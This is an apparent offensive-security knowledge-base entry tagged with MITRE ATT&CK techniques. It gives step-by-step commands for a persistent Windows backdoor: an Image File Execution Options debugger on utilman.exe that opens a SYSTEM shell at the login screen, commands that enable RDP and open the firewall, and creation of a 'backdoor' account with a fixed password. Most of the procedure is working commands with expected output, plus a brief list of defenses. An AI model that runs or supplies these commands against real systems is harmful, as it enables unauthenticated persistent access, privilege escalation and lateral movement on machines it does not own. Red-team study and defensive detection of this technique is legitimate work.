---
id: bd1889e4-e167-406e-81f5-aceaa5b98a82
type: procedure
description: >-
  This procedure sets up a persistent RDP backdoor on Windows by hijacking the
  utilman.exe accessibility feature to spawn a SYSTEM-level command prompt at
  the login screen, enabling remote access without authentication.
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.182556+00:00'
updated_at: '2023-04-10T20:37:23.607203+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Accessibility Features|T1015 - Accessibility Features]]'
  - '[[techniques/Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]'
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
sub_techniques: []
tags:
  - elevated
  - rdp-backdoor
  - utilman.exe
  - windows-persistence
commands:
  - '[[commands/add-utilman-debugger]]'
  - '[[commands/enable-rdp-service]]'
  - '[[commands/create-backdoor-user]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-RDP-Backdoor-using-utilman.exe

## Summary

This procedure hijacks the Windows accessibility feature utilman.exe by adding a registry debugger entry to spawn a SYSTEM-level command prompt when the Windows+U key combination is pressed at the login screen. This provides persistent, unauthenticated access to the system, which can then be used to enable Remote Desktop Protocol (RDP) and create a backdoor user account for lateral movement and privilege maintenance.

## Description

The utilman.exe process, responsible for the Ease of Access utility, can be abused by setting a debugger in the Image File Execution Options registry key to launch cmd.exe instead. This technique allows an attacker with initial administrative access to establish persistence. After implementation, even if the system reboots and the attacker is logged out, they can regain SYSTEM privileges at the login screen without credentials. From there, RDP can be enabled, firewall rules adjusted, and a hidden user account added for remote logins. This is particularly effective in domain environments for lateral movement, as it bypasses standard authentication and leverages a signed Microsoft binary for execution evasion. The procedure assumes Windows 10/11 or Server editions where RDP is available but may be disabled by default.

## Requirements

1. Administrative privileges on the target Windows system to modify the registry.
2. Access to run commands via an elevated prompt (e.g., via initial exploitation or physical access).
3. RDP service availability on the target (default on Windows Pro/Enterprise/Server).
4. Knowledge of the target's network configuration for subsequent RDP connections.

## Defense

- Monitor registry changes in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options for suspicious debugger entries.
- Disable or restrict accessibility features like utilman.exe via Group Policy if not required.
- Enable RDP logging and audit remote access events; use tools like Windows Event Viewer to detect anomalous logins.
- Implement application whitelisting (e.g., AppLocker) to prevent unsigned binaries or unexpected cmd.exe spawns from accessibility tools.
- Regularly scan for persistence mechanisms using tools like Autoruns.

## Objectives

1. Establish persistence via accessibility feature hijacking to regain SYSTEM access post-reboot.
2. Enable RDP for remote access without requiring login credentials.
3. Create a backdoor user account for authenticated RDP sessions.
4. Facilitate lateral movement and privilege escalation within the network.

## Instructions

### Step 1: Add Debugger to utilman.exe

**Context**: Modify the registry to configure utilman.exe to launch cmd.exe as SYSTEM. This sets up the initial backdoor trigger.

**Command** ([[commands/add-utilman-debugger]]):
```cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

> This command creates the debugger entry silently (/f flag forces overwrite). Run it from an elevated command prompt. Verify by checking the registry key afterward.

### Step 2: Reboot and Access SYSTEM Shell

**Context**: Reboot the system to simulate lockout or logout, then trigger the backdoor at the login screen to obtain a SYSTEM command prompt.

**Instructions**: Reboot the target using `shutdown /r /t 0` from the current session. At the login screen, press Windows Key + U. This launches cmd.exe as SYSTEM instead of the utility.

**Expected Output**: A black command prompt window opens with SYSTEM privileges (verify with `whoami` showing `nt authority\system`).

### Step 3: Enable RDP Service

**Context**: From the SYSTEM shell, enable the RDP service and adjust firewall rules to allow incoming connections on port 3389.

**Command** ([[commands/enable-rdp-service]]):
```cmd
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

> This disables the denial of TS connections and enables the RDP firewall rule. Restart the Terminal Services if needed with `net stop termservice && net start termservice`.

### Step 4: Create Backdoor User Account

**Context**: Add a new local user for RDP authentication and grant it remote desktop access to maintain the backdoor.

**Command** ([[commands/create-backdoor-user]]):
```cmd
net user backdoor Password123! /add && net localgroup "Remote Desktop Users" backdoor /add
```

> This creates a user 'backdoor' with password 'Password123!' and adds it to the Remote Desktop Users group. Change the password to something memorable but secure for ops.

### Step 5: Verify and Connect

**Context**: Test the backdoor by connecting via RDP from an attacker machine.

**Instructions**: From the SYSTEM shell, ensure RDP is listening with `netstat -an | find "3389"`. Then, from your attack machine, use an RDP client (e.g., mstsc.exe) to connect to the target's IP with username 'backdoor' and the set password.

**Expected Output**: Successful RDP login granting a desktop session as the backdoor user.
